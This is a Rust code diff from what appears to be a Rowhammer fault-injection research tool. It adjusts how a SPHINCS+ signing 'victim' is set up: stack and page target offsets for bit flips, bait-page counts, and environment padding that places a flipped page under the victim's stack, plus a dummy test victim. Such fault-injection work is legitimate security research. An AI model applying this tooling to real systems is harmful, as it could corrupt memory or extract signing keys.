@@ -102,14 +102,14 @@ pub struct TargetOffset {
     pub flip_direction: FlipDirection,
 }
 
-const _TARGET_OFFSETS_ANY: [TargetOffset; 1] = [TargetOffset {
+pub const TARGET_OFFSET_DUMMY: TargetOffset = TargetOffset {
     id: 0,
     description: "any",
     page_offset: 0,
-    stack_offset: 30,
+    stack_offset: 29,
     target_size: 0x1000,
     flip_direction: FlipDirection::Any,
-}];
+};
 
 const SPX_N: usize = 32;
 
@@ -204,23 +204,24 @@ pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 10] = [
 impl SphincsPlus {
     /// Create a new `SphincsPlus` victim.
     pub fn new(binary: String, flip: BitFlip) -> anyhow::Result<Self> {
-        let bait_count_after = HashMap::from([(32, 1), (31, 4), (30, 22)]); // TODO stabilitze bait count after for stack inejction w/ env
-        let target = if flip.flip_direction() == FlipDirection::ZeroToOne {
-            TARGET_OFFSETS_SHAKE_256S[9].clone()
+        let bait_count_after = HashMap::from([(32, 1), (31, 4), (30, 22), (29, 23)]); // TODO stabilize bait count after for stack inejction w/ env
+        let (target, env) = if binary.eq("victims/stack-dummy/stack") {
+            (TARGET_OFFSET_DUMMY.clone(), "".into())
         } else {
-            TARGET_OFFSETS_SHAKE_256S[7].clone()
+            let target = if flip.flip_direction() == FlipDirection::ZeroToOne {
+                TARGET_OFFSETS_SHAKE_256S[9].clone()
+            } else {
+                TARGET_OFFSETS_SHAKE_256S[7].clone()
+            };
+            if target.page_offset < flip.addr & PAGE_MASK {
+                bail!("Target offset {:x} is less than flip address page offset {:x}, not implemented yet.", target.page_offset, flip.addr & PAGE_MASK);
+            }
+            let (env, page_overflow) = make_env_for(flip.addr, target.page_offset);
+            assert!(!page_overflow, "Page overflow not implemented yet");
+            assert_eq!(flip.flip_direction(), target.flip_direction);
+            (target, env)
         };
-        if target.page_offset < flip.addr & PAGE_MASK {
-            bail!("Target offset is less than flip address, not implemented yet.");
-        }
-        let (env, page_overflow) = make_env_for(flip.addr, target.page_offset);
-        let stack_offset = if page_overflow {
-            target.stack_offset - 1
-        } else {
-            target.stack_offset
-        };
-
-        assert_eq!(flip.flip_direction(), target.flip_direction);
+        let stack_offset = target.stack_offset;
 
         let bait_count_after = *bait_count_after
             .get(&stack_offset)
